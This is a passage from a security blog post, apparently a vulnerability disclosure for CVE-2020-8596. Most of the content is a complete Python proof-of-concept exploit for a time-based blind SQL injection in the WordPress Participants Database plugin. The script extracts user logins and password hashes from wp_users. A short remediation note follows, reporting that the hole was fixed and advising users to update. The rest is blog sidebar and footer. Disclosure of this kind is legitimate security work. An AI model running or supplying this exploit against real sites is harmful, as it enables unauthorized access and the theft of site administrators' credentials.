+        wp_login = ip + '/wp-login.php'
+        wp_admin = ip + '/wp-admin/'
+
+        #Perform login
+        with requests.Session() as s:
+                headers1 = { 'Cookie':'wordpress_test_cookie=WP Cookie check' }
+                datas={
+                        'log':username, 'pwd':password, 'wp-submit':'Log In',
+                        'redirect_to':wp_admin, 'testcookie':'1'
+                }
+
+                s.post(wp_login, headers=headers1, data=datas)
+                resp = s.get(wp_admin)
+                cookies = s.cookies.get_dict()
+
+        return cookies
+
+
+def listParticipants_sqli(ip, inj_str, wpCookies):
+        for j in range(33, 126):
+                # Create request with iterated payload
+                target = "%s/wp-admin/admin.php?page=participants-database" % (ip)
+
+                data = {'action': 'admin_list_filter',
+                        'ascdesc': 'desc,' + inj_str.replace("[CHAR]", str(j)),
+                        'submit-button': 'Sort'}
+
+                r = requests.post(url = target, data = data, cookies = wpCookies)
+
+                responseTime = r.elapsed.total_seconds()
+
+                #Adjust for your required timings
+                if (responseTime > 9):
+                        return j
+        return None
+
+def getLength_sqli(ip, inj_str, wpCookies):
+        for j in range(48, 57):
+                # Create request with iterated payload
+                target = "%s/wp-admin/admin.php?page=participants-database" % (ip)
+
+                data = {'action': 'admin_list_filter',
+                        'ascdesc': 'desc,' + inj_str.replace("[CHAR]", str(j)),
+                        'submit-button': 'Sort'}
+
+                r = requests.post(url = target, data = data, cookies = wpCookies)
+
+                responseTime = r.elapsed.total_seconds()
+
+                #Adjust for your required timings
+                if (responseTime > 9):
+                        return j
+        return None
+
+
+def main():
+        #Get arguments from command line (IP address)
+        if len(sys.argv) != 2:
+                print "(+) usage: %s &lt;URL to WordPress Instance>" % sys.argv[0]
+                print '(+) eg: %s http://192.168.121.103/wordpress' % sys.argv[0]
+                sys.exit(-1)
+
+        ip = sys.argv[1]
+
+        userPass = []
+
+        wpDatabase = ["user_login", "user_pass"]
+
+        username = raw_input("(+) Please enter your wordpress username: ")
+
+        password = getpass.getpass("(+) Please enter your wordpress password: ")
+
+
+        #Perform injection for both username and password field
+        for field in wpDatabase:
+
+                print "(+) Retrieving length of %s field...." % (field)
+
+                wpCookies = wpLogin(ip, username, password)
+
+                #Get length of the field
+
+                finalLength = []
+
+                for i in range(1, 4):
+                        length_injection_string = "(select sleep(5) from wp_users where ascii(substring(length(%s),%d,1))=[CHAR] and id=1)" % (field, i)
+
+                        length_value = getLength_sqli(ip, length_injection_string, wpCookies)
+
+                        finalLength.append(str(length_value))
+
+                fieldLength = []
+                for item in finalLength:
+                        if (item != 'None'):
+                                fieldLength.append(item)
+
+                lengthArray = []
+
+                for f in fieldLength:
+                        chrConvert = chr(int(f))
+                        lengthArray.append(chrConvert)
+
+                finalFieldLength = ''.join(lengthArray)
+
+                intFieldLength = int(finalFieldLength) + 1
+
+                print "Field Length = " + finalFieldLength
+
+                # Extract data
+
+                print "(+) Exfiltrating data from %s...." % (field)
+
+                for i in range(1, intFieldLength):
+                        injection_string = "(select sleep(5) from wp_users where ascii(substring(%s,%d,1))=[CHAR] and id=1)" % (field, i)
+
+                        extracted_char = chr(listParticipants_sqli(ip, injection_string, wpCookies))
+
+                        sys.stdout.write(extracted_char)
+
+                        sys.stdout.flush()
+
+                print "\n(+) done!"
+
+if __name__ == "__main__":
+        main()
+</code></pre>
+
+
+
+<h4>Remediation</h4>
+
+
+
+<p>This SQL injection was super fun to work on. I have yet to find a time based SQL injection vulnerability in the wild until now. </p>
+
+
+
+<p> The developers of the Participants Database Plugin were contacted prior to this post to ensure they had adequate time to remediate the issue. They were super supportive and jumped straight on it. This has now been fixed with some parameterized queries.  </p>
+
+
+
+<p>If you are using Participants Database plugin 1.9.5.5 or below, please update now to the latest version!</p>
+
+
+
+<p>Peace.</p>
+															</div>
+
+							<div class="post-meta">
+																<!-- tags -->
+								<br>
+								<div class="entry-tags">
+									<span>
+										<i class="fa fa-tags"></i>
+									</span>
+									<a href="https://blog.impenetrable.tech/tag/cve-2020-8596">cve-2020-8596</a> <a href="https://blog.impenetrable.tech/tag/sql-injection">sql injection</a> <a href="https://blog.impenetrable.tech/tag/time-based">time based</a> <a href="https://blog.impenetrable.tech/tag/wordpress">wordpress</a> 
+								</div>
+								<!-- end tags -->
+															</div>
+							
+						</article>
+			
+	<nav class="navigation post-navigation" role="navigation" aria-label="Posts">
+		<h2 class="screen-reader-text">Post navigation</h2>
+		<div class="nav-links"><div class="nav-previous"><a href="https://blog.impenetrable.tech/newbie-hacker-blog" rel="prev"><span class="meta-nav">Previous Post</span> Diary of a Newbie Hacker: Part 1</a></div><div class="nav-next"><a href="https://blog.impenetrable.tech/diary-of-a-newbie-hacker-part-2" rel="next"><span class="meta-nav">Next Post</span> Diary of a Newbie Hacker: Part 2</a></div></div>
+	</nav>
+			
+		
+		</main><!-- #main -->
+	</div><!-- #primary -->
+
+				</div>
+
+				
+			            
+
+				<div class="col-md-4">
+					<div id="sidebar" class="sidebar">
+
+						<div id="search-2" class="widget widget_search">
+<form role="search" method="get" class="form-search" action="https://blog.impenetrable.tech/">
+
+  <div class="input-group">
+
+  	<label class="screen-reader-text" for="s">Search for:</label>
+    <input type="text" class="form-control search-query" placeholder="Search &amp; Help" value="" name="s" title="Search for:" />
+    <span class="input-group-btn">
+      <button type="submit" class="btn btn-default" name="submit" id="searchsubmit" value="Search"><i class="fa fa-search"></i></button>
+    </span>
+
+  </div>
+
+</form></div><div id="categories-2" class="widget widget_categories"><div class="widget-title"><span>Categories</span></div>		<ul>
+				<li class="cat-item cat-item-4"><a href="https://blog.impenetrable.tech/category/discovered-exploits">Discovered Exploits</a>
+</li>
+	<li class="cat-item cat-item-5"><a href="https://blog.impenetrable.tech/category/learning-to-hack">Learning to Hack</a>
+</li>
+	<li class="cat-item cat-item-2"><a href="https://blog.impenetrable.tech/category/tools">Tools</a>
+</li>
+		</ul>
+			</div><div id="archives-2" class="widget widget_archive"><div class="widget-title"><span>Archives</span></div>		<ul>
+				<li><a href='https://blog.impenetrable.tech/2020/03'>March 2020</a></li>
+	<li><a href='https://blog.impenetrable.tech/2020/02'>February 2020</a></li>
+	<li><a href='https://blog.impenetrable.tech/2020/01'>January 2020</a></li>
+		</ul>
+			</div><div id="custom_html-2" class="widget_text widget widget_custom_html"><div class="textwidget custom-html-widget"><br>
+<hr></div></div><div id="media_image-2" class="widget widget_media_image"><a href="https://www.impenetrable.tech" target="_blank" rel="noopener noreferrer"><img width="300" height="71" src="//blog.impenetrable.tech/wp-content/plugins/a3-lazy-load/assets/images/lazy_placeholder.gif" data-lazy-type="image" data-src="https://blog.impenetrable.tech/wp-content/uploads/2020/01/bigLogo2-1-300x71.png" class="lazy lazy-hidden image wp-image-187  attachment-medium size-medium" alt="Impenetrable" style="max-width: 100%; height: auto;" srcset="" data-srcset="https://blog.impenetrable.tech/wp-content/uploads/2020/01/bigLogo2-1-300x71.png 300w, https://blog.impenetrable.tech/wp-content/uploads/2020/01/bigLogo2-1-1024x244.png 1024w, https://blog.impenetrable.tech/wp-content/uploads/2020/01/bigLogo2-1-768x183.png 768w, https://blog.impenetrable.tech/wp-content/uploads/2020/01/bigLogo2-1-1536x366.png 1536w, https://blog.impenetrable.tech/wp-content/uploads/2020/01/bigLogo2-1.png 1822w" sizes="(max-width: 300px) 100vw, 300px" /><noscript><img width="300" height="71" src="https://blog.impenetrable.tech/wp-content/uploads/2020/01/bigLogo2-1-300x71.png" class="image wp-image-187  attachment-medium size-medium" alt="Impenetrable" style="max-width: 100%; height: auto;" srcset="https://blog.impenetrable.tech/wp-content/uploads/2020/01/bigLogo2-1-300x71.png 300w, https://blog.impenetrable.tech/wp-content/uploads/2020/01/bigLogo2-1-1024x244.png 1024w, https://blog.impenetrable.tech/wp-content/uploads/2020/01/bigLogo2-1-768x183.png 768w, https://blog.impenetrable.tech/wp-content/uploads/2020/01/bigLogo2-1-1536x366.png 1536w, https://blog.impenetrable.tech/wp-content/uploads/2020/01/bigLogo2-1.png 1822w" sizes="(max-width: 300px) 100vw, 300px" /></noscript></a></div><div id="simple-social-icons-2" class="widget simple-social-icons"><ul class="aligncenter"><li class="ssi-email"><a href="mailto:queries@impenetrable.tech" ><svg role="img" class="social-email" aria-labelledby="social-email-2"><title id="social-email-2">Email</title><use xlink:href="https://blog.impenetrable.tech/wp-content/plugins/simple-social-icons/symbol-defs.svg#social-email"></use></svg></a></li><li class="ssi-github"><a href="https://github.com/impenetrable" target="_blank" rel="noopener noreferrer"><svg role="img" class="social-github" aria-labelledby="social-github-2"><title id="social-github-2">GitHub</title><use xlink:href="https://blog.impenetrable.tech/wp-content/plugins/simple-social-icons/symbol-defs.svg#social-github"></use></svg></a></li><li class="ssi-linkedin"><a href="https://www.linkedin.com/company/impenetrable/" target="_blank" rel="noopener noreferrer"><svg role="img" class="social-linkedin" aria-labelledby="social-linkedin-2"><title id="social-linkedin-2">LinkedIn</title><use xlink:href="https://blog.impenetrable.tech/wp-content/plugins/simple-social-icons/symbol-defs.svg#social-linkedin"></use></svg></a></li><li class="ssi-twitter"><a href="https://twitter.com/ImpenetrableSec" target="_blank" rel="noopener noreferrer"><svg role="img" class="social-twitter" aria-labelledby="social-twitter-2"><title id="social-twitter-2">Twitter</title><use xlink:href="https://blog.impenetrable.tech/wp-content/plugins/simple-social-icons/symbol-defs.svg#social-twitter"></use></svg></a></li></ul></div>					</div>
+				</div>
+				
+			
+
+				</div><!-- END #content -->
+			
+			</div><!-- END .row -->
+		
+		</div><!-- END .container -->
+
+		<footer class="mz-footer" id="footer">
+
+			<!-- footer widgets -->
+			<div class="container footer-inner">
+				<div class="row row-gutter">
+					
+					</div>
+			</div>
+
+			<div class="footer-wide">
+					
+				</div>
+
+			<div class="footer-bottom">
+<!-- 				 -->
+				  Copyright © 2019 Impenetrable Ltd.
+			</div>
+		</footer>
+
+		<!-- back to top button -->
+		<p id="back-top">
+			<a href="#top"><i class="fa fa-angle-up"></i></a>
+		</p>
+
+		<style type="text/css" media="screen"> #simple-social-icons-2 ul li a, #simple-social-icons-2 ul li a:hover, #simple-social-icons-2 ul li a:focus { background-color: #040d26 !important; border-radius: 3px; color: #ffffff !important; border: 1px #ffffff solid !important; font-size: 20px; padding: 10px; }  #simple-social-icons-2 ul li a:hover, #simple-social-icons-2 ul li a:focus { background-color: #040d26 !important; border-color: #7ea732 !important; color: #7ea732 !important; }  #simple-social-icons-2 ul li a:focus { outline: 1px dotted #040d26 !important; }</style><script type='text/javascript'>
+/* <![CDATA[ */
+var prism_settings = {"pluginUrl":"https:\/\/blog.impenetrable.tech\/wp-content\/plugins\/code-syntax-block\/"};
+/* ]]> */
+</script>
+<script type='text/javascript' src='https://blog.impenetrable.tech/wp-content/plugins/code-syntax-block/assets/prism/prism.js?ver=1591901883'></script>
+<script type='text/javascript'>
+/* <![CDATA[ */
+var a3_lazyload_params = {"apply_images":"1","apply_videos":"1"};
+/* ]]> */
+</script>
+<script type='text/javascript' src='//blog.impenetrable.tech/wp-content/plugins/a3-lazy-load/assets/js/jquery.lazyloadxt.extra.min.js?ver=2.3.2'></script>
+<script type='text/javascript' src='//blog.impenetrable.tech/wp-content/plugins/a3-lazy-load/assets/js/jquery.lazyloadxt.srcset.min.js?ver=2.3.2'></script>
+<script type='text/javascript'>
+/* <![CDATA[ */
+var a3_lazyload_extend_params = {"edgeY":"0","horizontal_container_classnames":""};
+/* ]]> */
+</script>
+<script type='text/javascript' src='//blog.impenetrable.tech/wp-content/plugins/a3-lazy-load/assets/js/jquery.lazyloadxt.extend.js?ver=2.3.2'></script>
+<script type='text/javascript' src='https://blog.impenetrable.tech/wp-includes/js/wp-embed.min.js?ver=5.4.7'></script>
+
+	</body>
+</html>
